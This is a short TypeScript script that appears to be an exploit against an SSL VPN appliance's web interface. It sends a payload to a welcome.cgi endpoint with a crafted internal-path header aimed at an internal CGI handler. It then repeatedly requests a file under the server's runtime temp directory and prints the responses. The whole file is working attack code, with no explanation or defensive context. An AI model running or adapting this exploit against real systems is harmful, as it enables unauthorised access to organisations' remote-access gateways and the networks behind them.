import axios from 'axios';
const endpoint: string = process.argv[2] + '/dana-na/auth/url_default/welcome.cgi';
const digest: string = process.argv[3];
async function route(): Promise<void> {
  await axios.request({url: endpoint, method: 'POST', headers: {
    'X-DSCGI-PATH': '/home/webserver/htdocs/dana/fb/smb/wu.cgi'
  }, data: process.argv[4]});
  for (let attempt = 0; attempt < 16; attempt++) {
    const response = await axios.request({url: endpoint, method: 'GET', headers: {
      'X-DSCGI-PATH': '/home/runtime/tmp/' + digest
    }});
    console.log(response.data);
  }
}
route();
